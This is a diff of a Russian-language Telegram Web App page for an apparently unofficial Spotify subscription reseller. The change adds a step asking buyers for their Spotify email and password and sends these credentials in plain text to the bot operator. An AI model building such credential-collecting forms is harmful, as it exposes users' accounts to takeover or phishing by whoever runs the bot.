@@ -1,86 +1,202 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spotify Store</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        /* Адаптируем цвета под тему пользователя в Telegram */
-        body {
-            background-color: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-        }
-        h2 { text-align: center; margin-bottom: 20px; }
-        .category { font-weight: bold; margin-top: 20px; margin-bottom: 10px; color: var(--tg-theme-hint-color, #999999); }
-        
-        .plan-card {
-            background-color: var(--tg-theme-secondary-bg-color, #f1f1f1);
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 12px;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: transform 0.1s;
-        }
-        .plan-card:active { transform: scale(0.97); }
-        
-        .plan-info h3 { margin: 0 0 5px 0; font-size: 16px; }
-        .plan-info p { margin: 0; font-size: 13px; color: var(--tg-theme-hint-color, #999999); }
-        .plan-price { font-weight: bold; font-size: 16px; color: var(--tg-theme-button-color, #3390ec); }
-    </style>
+  <meta charset="UTF-8">
+  <title>SpotSub</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial;
+      background: #0f0f0f;
+      color: white;
+      padding: 20px;
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .card {
+      background: #1a1a1a;
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 15px;
+      transition: 0.2s;
+    }
+
+    .card:hover {
+      transform: scale(1.02);
+    }
+
+    .price {
+      font-size: 20px;
+      font-weight: bold;
+      margin: 10px 0;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #1db954;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border-radius: 8px;
+      border: none;
+      background: #2a2a2a;
+      color: white;
+      font-size: 14px;
+    }
+
+    .tag {
+      background: #1db954;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-size: 12px;
+      margin-left: 5px;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
 </head>
 <body>
 
-    <h2>Выберите подписку 🎧</h2>
+<h1>🎧 SpotSub</h1>
 
-    <div class="category">Индивидуальная</div>
-    <div class="plan-card" onclick="selectPlan('individual', '1m', 220, 'Индивидуальная', '1 мес.')">
-        <div class="plan-info"><h3>1 месяц</h3><p>Один аккаунт</p></div>
-        <div class="plan-price">220 ₽</div>
-    </div>
-    <div class="plan-card" onclick="selectPlan('individual', '6m', 1100, 'Индивидуальная', '6 мес.')">
-        <div class="plan-info"><h3>🔥 6 месяцев</h3><p>Рекомендуем</p></div>
-        <div class="plan-price">1100 ₽</div>
-    </div>
-    <div class="plan-card" onclick="selectPlan('individual', '12m', 1800, 'Индивидуальная', '1 год')">
-        <div class="plan-info"><h3>💎 1 год</h3><p>Максимальная выгода</p></div>
-        <div class="plan-price">1800 ₽</div>
-    </div>
+<!-- ШАГ 1 -->
+<div id="step1">
 
-    <div class="category">Общие</div>
-    <div class="plan-card" onclick="selectPlan('duo', '1m', 349, 'Duo (Для двоих)', '1 мес.')">
-        <div class="plan-info"><h3>Duo</h3><p>Для двоих (1 мес)</p></div>
-        <div class="plan-price">349 ₽</div>
-    </div>
-    <div class="plan-card" onclick="selectPlan('family', '1m', 499, 'Семейная', '1 мес.')">
-        <div class="plan-info"><h3>Family ⭐️</h3><p>До 6 человек (1 мес)</p></div>
-        <div class="plan-price">499 ₽</div>
-    </div>
+  <div class="card">
+    <h2>Индивидуальная</h2>
+    <div class="price">220 ₽ / 1 мес</div>
+    <button onclick="selectPlan('individual','Индивидуальная','1m',220,'1 месяц')">Выбрать</button>
+  </div>
 
-    <script>
-        // Инициализируем Web App
-        let tg = window.Telegram.WebApp;
-        tg.expand(); // Разворачиваем на весь экран
+  <div class="card">
+    <h2>3 месяца</h2>
+    <div class="price">650 ₽</div>
+    <button onclick="selectPlan('individual','Индивидуальная','3m',650,'3 месяца')">Выбрать</button>
+  </div>
 
-        // Функция отправки данных в бота при клике на карточку
-        function selectPlan(planKey, duration, price, planName, durText) {
-            let orderData = {
-                plan_key: planKey,
-                duration: duration,
-                price_rub: price,
-                plan_name: planName,
-                dur_text: durText
-            };
-            
-            // Метод sendData работает только если Web App открыт с обычной клавиатуры (ReplyKeyboardMarkup)
-            tg.sendData(JSON.stringify(orderData));
-        }
-    </script>
+  <div class="card">
+    <h2>🔥 6 месяцев <span class="tag">Выгодно</span></h2>
+    <div class="price">1100 ₽</div>
+    <button onclick="selectPlan('individual','Индивидуальная','6m',1100,'6 месяцев')">Выбрать</button>
+  </div>
+
+  <div class="card">
+    <h2>💎 12 месяцев</h2>
+    <div class="price">1800 ₽</div>
+    <button onclick="selectPlan('individual','Индивидуальная','12m',1800,'1 год')">Выбрать</button>
+  </div>
+
+  <div class="card">
+    <h2>Duo</h2>
+    <div class="price">349 ₽</div>
+    <button onclick="selectPlan('duo','Duo','1m',349,'1 месяц')">Выбрать</button>
+  </div>
+
+  <div class="card">
+    <h2>Family</h2>
+    <div class="price">499 ₽</div>
+    <button onclick="selectPlan('family','Family','1m',499,'1 месяц')">Выбрать</button>
+  </div>
+
+</div>
+
+<!-- ШАГ 2 -->
+<div id="step2" class="hidden">
+
+  <div class="card">
+    <h2>Введите данные</h2>
+
+    <input id="email" placeholder="Email Spotify">
+    <input id="password" type="password" placeholder="Пароль">
+
+    <button onclick="sendOrder()">Продолжить</button>
+  </div>
+
+</div>
+
+<!-- ШАГ 3 -->
+<div id="step3" class="hidden">
+
+  <div class="card">
+    <h2>Подтверждение</h2>
+
+    <p id="summary"></p>
+
+    <button onclick="finalSend()">Перейти к оплате</button>
+  </div>
+
+</div>
+
+<script>
+  const tg = window.Telegram.WebApp;
+  tg.expand();
+
+  let selectedPlan = {};
+  let userData = {};
+
+  function selectPlan(plan_key, plan_name, duration, price, dur_text) {
+    selectedPlan = {
+      plan_key,
+      plan_name,
+      duration,
+      price_rub: price,
+      dur_text
+    };
+
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+  }
+
+  function sendOrder() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!email || !password) {
+      alert("Заполни все поля");
+      return;
+    }
+
+    userData = {
+      ...selectedPlan,
+      email,
+      password
+    };
+
+    document.getElementById('step2').classList.add('hidden');
+    document.getElementById('step3').classList.remove('hidden');
+
+    document.getElementById('summary').innerHTML = `
+      План: <b>${selectedPlan.plan_name}</b><br>
+      Срок: <b>${selectedPlan.dur_text}</b><br>
+      К оплате: <b>${selectedPlan.price_rub} ₽</b>
+    `;
+  }
+
+  function finalSend() {
+    tg.sendData(JSON.stringify(userData));
+  }
+</script>
+
 </body>
 </html>
